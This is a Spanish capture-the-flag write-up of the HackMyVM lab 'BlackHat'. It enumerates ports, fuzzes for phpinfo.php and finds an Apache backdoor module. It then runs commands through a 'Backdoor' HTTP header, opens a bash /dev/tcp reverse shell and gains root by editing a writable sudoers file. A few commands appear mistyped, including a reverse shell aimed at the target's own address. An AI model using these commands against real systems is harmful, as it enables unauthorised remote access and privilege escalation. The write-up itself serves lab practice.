---
layout: post
title: BlackHat
date: 2022-11-29
categories: ["HMV", "Enumeration", "PHP", "File Edit"]
thumbnail: "assets/images/BlackHat.png"
---

# BlackHat [ Hack My VM ]

### Reconocimiento
##### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 192.168.1.118 -oG allPorts`
- `nmap -sCV -p80 192.168.1.118 -oN targeted`

No vemos nada interesante, sigamos investigando.

### Shell
Como no hemos visto nada interesante vamos a hacer `fuzzing`, en mi caso utilizaré `WFuzz`, una herramienta en `Python`. Antes de eso me fijé que utilizaba `PHP`, por lo que en vez de buscar directorios busqué por archivos `PHP`.

```
wfuzz -u "192.168.1.118/FUZZ.php" -w directory-list-2.3-medium.txt --hc 404
```

Tras unos minutos de espera veremos un archivo `PHP` con el nombre de `phpinfo.php`. Dicho fichero contiene la información de `PHP` representada, por lo que es bastante útil a la hora de descubrir cosas.

Bien, tras un rato mirando me fijé en `Loaded Modules`, había un módulo algo extraño llamado `mod_backdoor`. Busqué información sobre éste módulo y llegué a un `script` en `Python` hecho por [`WangYihang`](https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor/blob/master/exploit.py) el cual si inspeccionamos el código veremos que para enviar un comando utiliza el `header` `Backdoor`.

Sabiendo esto podemos crear nosotros mismos esa petición con `CURL`, vamos allá:

- `curl -H "Backdoor: id" http://192.168.1.118`

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bien! Vemos que podemos ejecutar comandos de forma remota! Ahora tenemos que ganar una Shell, para ello me copié una Reverse Shell de [`IronHackers`](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/) en `Bash`. Antes de enviar el comando nos tenemos que poner es escucha con `NC` por el puerto que queramos, en mi caso el `4444`:

- `nc -nlvp 4444`

Ahora sí estamos preparados para entablar una conexión:

- `curl -H "Backdoor: bash -c 'bash -i >& /dev/tcp/192.168.1.118/4444 0>&1'" http://192.168.1.118`

Bien! Hemos recibido una Shell como `www-data`!

### Subida de privilegios #1
Una vez dentro de la máquina me dispuse a listar los usuarios, antes de mirar el archivo `/etc/passwd` me gusta listar el directorio `/home/`. Vemos a un usuario con el nombre `darkdante`.

Tras varios minutos sin conseguir nada como `www-data` ejecuté el siguiente comando:

- `sudo - darkdante`

Wow! No hemos proporcionado contraseña y estamos como `Darkdante`! 

### Subida de privilegios #2
Ahora que ya estamos como `Darkdante` podemos continuar con nuestro objetivo: obtener `root`. Para ello comencé con enumeración básica, aunque no sirvió de nada. Tras un rato me puse a ver los archivos importantes: `/etc/passwd`, `/etc/shadow` (no tenía permisos) y, por último `/etc sudoers`, el cual podía editar.

Vaya sorpresa, generalmente dicho archivo no se puede editar debido a los riesgos que conlleva, pero como se puede editar vamos a poner nuestro nombre de usuario para que pueda ejecutar todo como `root` sin contraseña.

Para ello añadiremos la siguiente línea justo debajo de `root`:

```
darkdante ALL=(ALL:ALL) ALL
```

Una vez hecho lo anterior ejecutamos `sudo su` para ser `root`.

Enhorabuena! Estamos en la máquina como `root`! Qué fácil!
